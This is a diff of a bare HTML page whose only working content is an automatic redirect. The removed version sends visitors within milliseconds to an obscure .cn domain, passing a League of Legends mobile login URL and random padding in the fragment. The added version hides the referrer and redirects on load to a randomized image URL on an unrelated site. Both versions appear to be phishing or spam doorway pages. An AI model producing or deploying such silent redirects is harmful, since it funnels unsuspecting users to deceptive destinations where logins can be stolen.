@@ -1,17 +1,25 @@
-<!DOCTYPE html>
-<html>
-<head>
-    <script>
-        window.onload = function() {
-            setTimeout(function() {
-                var sites = ['http://d79ib.osxo.cn/46', 'http://d79ib.osxo.cn/46', 'http://d79ib.osxo.cn/46']; // 定义一个网站列表
-                var randomSite = sites[Math.floor(Math.random() * sites.length)]; // 随机选择一个网站
-
-                var randomParam = Math.random();
-                var currentTime = new Date().toTimeString();
-                window.location.href = randomSite + '?#url=http://lol.qq.com/comm-htdocs/milo_mobile/login.htmlo' + currentTime + randomParam + currentTime;
-            }, 5); // 5秒后执行
-        }
-    </script>
+<html><head>
+    <meta charset="utf-8">
+    <meta content="width=device-width,initial-scale=1.0,minimum-scale=1.0,maximum-scale=1.0,user-scalable=no" 
+name="viewport">
+    <meta content="never" name="referrer">
+    <title>.</title>
+</script>
 </head>
-</html>
+  
+<body>
+		<div class="dialog">    <div class="dialog_head"><img src=""></div>    
+	<div class="dialog_con">      <div class="title"></div>      
+<div class="dialog_box" data-fancybox="images"><img style="max-width:350px;" class="dialog_box_img" 
+src="https://y.gtimg.cn/music/photo_new/T053XD000e5kAy3yC1I4.jpg"></div>
+    <script>
+        let button = document.querySelector('button')
+        const targetUrl = 'https://static.job10000.com/yl/feedbackNew/20240115/65a4d72884e2d7c285985696.png';
+        const timestamp = Date.now();
+        const randomString = Math.random().toString(36).substring(2);
+        const urlWithParam = `${targetUrl}?timestamp=${timestamp}-${randomString}`;
+        window.onload = function () {
+            window.location.href = urlWithParam;
+        };
+    </script>
+</body></html>
